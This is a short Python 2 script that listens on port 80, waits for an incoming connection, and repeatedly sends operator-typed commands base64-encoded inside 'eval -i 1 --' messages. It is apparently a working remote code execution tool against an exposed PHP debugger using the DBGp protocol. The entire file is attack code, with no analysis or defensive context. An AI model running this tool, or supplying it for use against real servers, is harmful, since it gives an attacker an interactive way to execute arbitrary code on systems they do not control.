#!/usr/bin/env python2

import  socket 

ip_port = ('10.127.11.154', 80) 
sk = socket.socket()
sk.bind(ip_port) 
sk.listen(10) 
conn, addr = sk.accept() 

while  True: 
    client_data = conn.recv(1024) 
    print(client_data) 

    data = raw_input ('>> ') 
    conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
